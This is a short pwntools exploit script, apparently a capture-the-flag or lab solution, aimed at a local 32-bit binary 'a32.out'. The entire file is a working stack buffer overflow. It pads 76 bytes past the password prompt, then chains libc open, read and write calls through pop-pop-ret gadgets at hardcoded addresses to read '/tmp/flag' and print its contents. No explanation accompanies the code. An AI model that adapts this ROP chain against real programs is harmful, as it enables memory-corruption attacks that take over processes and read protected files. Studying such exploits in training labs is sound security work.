from pwn import *
io = process('./a32.out')

elf = ELF('./a32.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# libc base address
base_addr = 0xf7c00000 	# varies in different libc and ubuntu version
# PPR and PPPR
PPR = base_addr + 0x3958a
PPPR = base_addr + 0x4cab8
# write the flag to the writable_addr
writable_addr = 0x804c700
# string_addr = "/tmp/flag"
string_addr = 0xffffcfd0
# fileName
fileName = b'/tmp/flag\0' 
payload = fileName + cyclic(76 - len(fileName)) 
# open the /tmp/flag
# open("/tmp/flag", 0)
payload += p32(base_addr + libc.symbols['open'])
payload += p32(PPR)
payload += p32(string_addr)
payload += p32(0)
# read the flag
# read(3, writable_addr, 10)
payload += p32(base_addr + libc.symbols['read'])
payload += p32(PPPR)
payload += p32(3)
payload += p32(writable_addr)
payload += p32(10)
# write the flag
# write(1, writable_addr, 10)
payload += p32(base_addr + libc.symbols['write'])
payload += p32(PPPR)
payload += p32(1)
payload += p32(writable_addr)
payload += p32(10)


# gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
io.sendafter(b'Password:', payload)
io.interactive()


